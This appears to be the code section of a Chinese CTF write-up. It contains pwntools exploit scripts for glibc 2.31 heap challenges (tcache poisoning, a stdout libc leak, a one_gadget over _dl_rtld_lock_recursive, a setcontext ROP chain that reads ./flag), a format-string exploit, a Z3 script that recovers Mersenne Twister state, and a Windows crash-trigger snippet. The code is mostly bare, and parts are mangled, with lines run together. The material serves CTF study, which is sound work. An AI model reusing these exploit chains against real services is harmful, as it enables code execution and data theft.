 if self.index == 0:
 self.generate()
 y = self.MT[self.index]
 y = y ^ self.cs2l(y, 11) ^ self.cs2l(y,15)
 y = y ^ self.cs2r(y,7) ^ self.cs2r(y,19)
 self.index = (self.index + 1) % 624
 return y
 def cs2l(self, y, shift):
 return ((y << shift) ^ (y >> (32 - shift))) & 0xffffffff
 def cs2r(self, y, shift):
 return ((y >> shift) ^ (y << (32 - shift))) & 0xffffffff
def generate(self):
 for i in range(624):
 y = (self.MT[i] & 0x80000000) + (self.MT[(i+1)%624] & 0x7fffffff)
 self.MT[i] = self.MT[(i+397)%624] ^ (y >> 1)
 if y & 1:
 self.MT[i] ^= 2567483520
for i in range(1,624):
 t = 2037740385 * (self.MT[i-1] ^ (self.MT[i-1] >> 30)) + 1
 self.MT[i] = t & 0xffffffff
def fix(num):
 mask = bin(2037740385)[2:].rjust(32,"0")
 source = bin(num)[2:].rjust(32,"0")
 res = ''
 for i in range(32):
 if mask[i] == '1':
 res += source[i]
 else:
 res += '?'
 return res
random_num = [...]
for i in range(2000):
 ut.submit(fix(random_num[i]))
def get_symbolic(self, guess):
 name = next(SYMBOLIC_COUNTER)
 guess = guess.zfill(32)

 self.symbolic_guess = BitVec('symbolic_guess_%d'%(name), 32)
 guess = guess[::-1]

 for i, bit in enumerate(guess):
 if bit != '?':
 self.solver.add(Extract(i, i, self.symbolic_guess) == bit)

 return self.symbolic_guess
def symbolic_untamper(self, solver, y):
 name = next(SYMBOLIC_COUNTER)

 y1 = BitVec('y1_%d'%(name), 32)
 y2 = BitVec('y2_%d'%(name), 32)
 y3 = BitVec('y3_%d'%(name), 32)
 y4 = BitVec('y4_%d'%(name), 32)

 equations = [
 y2 == y1 ^ (LShR(y1, 11)),
 y3 == y2 ^ ((y2 << 7) & 0x9D2C5680),
 y4 == y3 ^ ((y3 << 15) & 0xEFC60000),
 y == y4 ^ (LShR(y4, 18))
 ]

 solver.add(equations)
 return y1
self.solver.add(self.MT)
def symbolic_twist(self, MT, n=624, upper_mask=0x80000000, lower_mask=0x7FFFFFFF, a=0x9908B0DF, m=397):
 MT = [i for i in MT]
 for i in range(n):
 x = (MT[i] & upper_mask) + (MT[(i+1) % n] & lower_mask)
 xA = LShR(x, 1)
 xB = If(x & 1 == 0, xA, xA ^ a)
 MT[i] = MT[(i + m) % n] ^ xB
name = next(SYMBOLIC_COUNTER)
 next_mt = self.symbolic_twist(self.MT)
 self.MT = [BitVec('MT_%d_%d'%(i,name), 32) for i in range(624)]
 for i in range(624):
 self.solver.add(self.MT[i] == next_mt[i])
 self.index = 0
def get_random(self):
 self.solver.check()
 model = self.solver.model()
 state = list(map(lambda x: model[x].as_long(), self.MT))
 result_state = (3, tuple(state+[self.index]), None)
 r = Random()
 r.setstate(result_state)
 return r
    #encoding: utf-8#!/usr/bin/python
from pwn import *import sys#from LibcSearcher import LibcSearcher
context.log_level = 'debug'context.arch='amd64'
local=0binary_name='pwn'libc_name='libc-2.31.so'ld_name='ld-2.31.so'
libc=ELF("./"+libc_name)ld=ELF("./"+ld_name)elf=ELF("./"+binary_name)
def exp(): if local: p=process("./"+binary_name) #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name}) #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name]) #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name]) else: p=remote('0.0.0.0',9999)
 def z(a=''): if local: gdb.attach(p,a) if a=='': raw_input else: pass
 ru=lambda x:p.recvuntil(x,timeout=3) sl=lambda x:p.sendline(x) sd=lambda x:p.send(x) sa=lambda a,b:p.sendafter(a,b) sla=lambda a,b:p.sendlineafter(a,b) ia=lambda :p.interactive()
 def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : return u64(p.recv(6).ljust(8,b'x00'))
 def cho(num): sla('Your choice:',str(num))
 def add(idx,size): cho(1) sla('Idx:',str(idx)) sla('Size:',str(size))
 def edit(idx,con): cho(2) sla('Idx:',str(idx)) sla('context: ',con)
 def delete(idx): cho(3) sla('Idx:',str(idx))
 # variables
 # gadgets
 og=[0xe6c7e,0xe6c81,0xe6c84,0xe6e73,0xe6e76]
 # helper functions
 op32 = make_packer(32, endian='big', sign='unsigned') # opposite p32 op64 = make_packer(64, endian='big', sign='unsigned') # opposite p64
 # main
 add(0,0x18) # 0 待会用来溢出改下个堆块size为0x481 add(1,0x410) # 1 待会被改size的堆块 add(2,0x28) # 2 使tcache计数器为2 add(3,0x28) # 3 跟上面配合堆块重叠 add(4,0x18) # 4 防止合并
 payload=0x18*'x00'+'x81' edit(0,payload)
 delete(1) # 释放堆块使其连带下面的堆块进入unsorted bin delete(2) delete(3)
 add(5,0x440) # 切割,使main_arena+96地址写在tcache的fd位 add(6,0x18) # 0x38不会申请出tcache,且unsorted bin剩余部分不足0x20,申请出与tcache里堆块相同的地址 payload='xa0x46' edit(6,payload) # 修改_IO_2_1_stdout_结构体的地址的最低2字节,4需要爆破1/16 #z() #pause() add(6,0x28) # 6 add(7,0x28) # 7
 payload=p64(0xfbad1800)+p64(0)*3+b'x00' edit(7,payload) _IO_2_1_stdin_=u64(ru("x7f")[-6:].ljust(8,'x00')) libc_base=_IO_2_1_stdin_-libc.symbols['_IO_2_1_stdin_'] ld_base=libc_base+0x1f4000 system_addr=libc_base+libc.symbols['system'] one_gadget=libc_base+og[0] _rtld_global = ld_base + ld.sym['_rtld_global'] _dl_rtld_lock_recursive = _rtld_global + 0xf08 success('libc_base:'+hex(libc_base)) success('ld_base:'+hex(ld_base)) success('_dl_rtld_lock_recursive:'+hex(_dl_rtld_lock_recursive)) success('one_gadget:'+hex(one_gadget)) #pause() add(0,0x18) # 0 待会用来溢出改下个堆块size为0x481 add(1,0x410) # 1 待会被改size的堆块 add(2,0x28) # 2 使tcache计数器为2 add(3,0x28) # 3 跟上面配合堆块重叠 add(4,0x18) # 4 防止合并
 payload=0x18*'x00'+'x81' edit(0,payload)
 delete(1) # 释放堆块使其连带下面的堆块进入unsorted bin delete(2) delete(3)
 add(5,0x440) # 切割,使main_arena+96地址写在tcache的fd位 add(6,0x18) # 0x38不会申请出tcache,且unsorted bin剩余部分不足0x20,申请出与tcache里堆块相同的地址 payload=p64(_dl_rtld_lock_recursive) edit(6,payload) # 申请出_dl_rtld_lock_recursive add(6,0x28) # 6 add(7,0x28) # 7
 payload=p64(one_gadget) edit(7,payload) success('_dl_rtld_lock_recursive:'+hex(_dl_rtld_lock_recursive)) success('one_gadget:'+hex(one_gadget)) #pause() cho(4) ia()

time=0while True: try: time+=1 log.warn('time:'+str(time)) exp() break 
except:        continue
    #encoding: utf-8#!/usr/bin/python
from pwn import *import sys#from LibcSearcher import LibcSearcher
context.log_level = 'debug'context.arch='amd64'
local=1binary_name='pwn'libc_name='libc-2.31.so'
libc=ELF("./"+libc_name)elf=ELF("./"+binary_name)
if local: p=process("./"+binary_name) #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name}) #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name]) #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])else: p=remote('0.0.0.0',9999)
def z(a=''): if local: gdb.attach(p,a) if a=='': raw_input else: pass
ru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sa=lambda a,b:p.sendafter(a,b)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()
def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : return u64(p.recv(6).ljust(8,b'x00'))
def cho(num): sla('Your choice:',str(num))
def add(size,con): cho(1) sla('Size:',str(size)) sa('Content:',con)
def show(idx): cho(3) sla('Idx:',str(idx))
def delete(idx): cho(2) sla('Idx:',str(idx))
# variables
# gadgets
# helper functions
op32 = make_packer(32, endian='big', sign='unsigned') # opposite p32op64 = make_packer(64, endian='big', sign='unsigned') # opposite p64
# main
add(0x410,'con') # 0add(0x10,'con') # 1delete(0)
add(0x200,'A'*8) # 0show(0)ru('A'*8)unsorted_addr=leak_address()libc_base=unsorted_addr-0x1ebfd0__free_hook=libc_base+libc.sym['__free_hook']_IO_file_jumps=libc_base+libc.sym['_IO_file_jumps']setcontext=libc_base+libc.sym['setcontext']_IO_helper_jumps=libc_base+0x1ec8a0open_addr=libc_base+libc.sym['open']read_addr=libc_base+libc.sym['read']puts_addr=libc_base+libc.sym['puts']pop_rdi=libc_base+0x26b72pop_rsi=libc_base+0x27529pop_rdx_r12=libc_base+0x11c371success("libc_base:"+hex(libc_base))success('_IO_file_jumps:'+hex(_IO_file_jumps))success('_IO_helper_jumps:'+hex(_IO_helper_jumps))success('setcontext:'+hex(setcontext))
delete(0)
add(0x200,'A'*0x10) # 0show(0)ru('A'*0x10)heap_addr=leak_address()success('heap_addr:'+hex(heap_addr))
delete(0)delete(1)
payload = p64(heap_addr+0x2e0)+p64(heap_addr+0x680)+p64(heap_addr+0x920)
add(0x21918,payload) # 0
# 覆盖_IO_file_sync为setcontext+61for i in range(1,10): add(0x10,'con')
for i in range(1,10): delete(i)
delete(-17406)
for i in range(1,8): add(0x10,'con')
add(0x10,p64(_IO_file_jumps+0x60)) # 8add(0x10,'con') # 9add(0x10,'con') # 10add(0x10,p64(setcontext+61)) # 11
# 往_IO_helper_jumps布置寄存器数据
# 构造fake_frameframe = SigreturnFrame()frame.rdi = 0frame.rsi = __free_hookframe.rdx = 0x2000frame.rsp = __free_hookframe.rip = read_addr # 对应setcontext里的rcx,后面会被push
for i in range(12,21): add(0x60,'con')
for i in range(12,21): delete(i)
delete(-17405)
for i in range(12,19): add(0x60,'con')
add(0x60,p64(_IO_helper_jumps+0x68)) # 19add(0x60,'con') # 20add(0x60,'con') # 21add(0x60,str(frame)[0x68:
0x68+0x50]) # 22
# 改top_chunk的size，用于触发assertfor i in range(23,32): add(0x30,'con')
for i in range(23,32): delete(i)
delete(-17404)
for i in range(23,30): add(0x30,'con')
add(0x30,p64(heap_addr+0x990)) # 30add(0x30,'con') # 31add(0x30,'con') # 32add(0x30,p64(0x18)*2) # 33
    #z("b *"+hex(setcontext+61))#pause()
cho(1)sla('Size:',str(0x30))
orw = p64(pop_rdi)+p64(__free_hook+0xf8)orw += p64(pop_rsi)+p64(0)orw += p64(pop_rsi)+p64(0)+p64(open_addr)
orw += p64(pop_rdi)+p64(3)orw += p64(pop_rsi)+p64(__free_hook+0x100)orw += p64(pop_rdx_r12)+p64(0x30)+p64(0)+p64(read_addr)
orw += p64(pop_rdi)+p64(__free_hook+0x100)+p64(puts_addr)
orw = orw.ljust(0xf8,'x00')orw += b'./flagx00x00'
sleep(1)sd(orw)

ia()
#!/usr/bin/python
from pwn import *import sys
context.log_level = 'debug'context.arch='amd64'
local=0
if local: p=process("./"+binary_name) #p=process("./"+binary_name,env={"LD_PRELOAD":"./"+libc_name}) #p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./"+binary_name]) #p = process(argv=["./qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "-g", "1234", "./"+binary_name])else: p=remote('0.0.0.0',9999)
def z(a=''): if local: gdb.attach(p,a) if a=='': raw_input else: pass
def leak_address(): if(context.arch=='i386'): return u32(p.recv(4)) else : return u64(p.recv(6).ljust(8,b'x00'))
ru=lambda x:p.recvuntil(x)sl=lambda x:p.sendline(x)sd=lambda x:p.send(x)sa=lambda a,b:p.sendafter(a,b)sla=lambda a,b:p.sendlineafter(a,b)ia=lambda :p.interactive()
sa("What's your name?n",'A'*8)ru('A'*8)heap_addr=leak_address()success("heap_addr:"+hex(heap_addr))
payload="Yesn".ljust(8,'x00')+p64(heap_addr-0x8)sa("Do you want it?n",payload)ru("Here is your gift:")gift_addr=int(p.recv(14),16)success("gift_addr:"+hex(gift_addr))
target_addr=gift_addr+0x1a8payload="%11$hhn|"+fmtstr_payload(13,{target_addr:
heap_addr},numbwritten=1)#z("b *$rebase(0x14E6)")#pause()sa("Now,to find your flag in the gift!n",payload)
ia()
class Test {public: Test() { atexit(OnExit); PVOID pvParameter = NULL; DWORD dwPingInterval = RECOVERY_DEFAULT_PING_INTERVAL; DWORD dwFlags = 0; HRESULT hRes = RegisterApplicationRecoveryCallback(ApplicationRecoverCallback, pvParameter, dwPingInterval, dwFlags); }};
void OnExit(){ WerReportHang(GetForegroundWindow(), NULL); TriggerException();}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/1-1653309358.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/3-1653309359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/9-1653309359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/0-1653309359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/7-1653309359.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/1-1653309360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/7-1653309360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/5-1653309360.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/2-1653309361.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/05/0-1653309361.jpeg)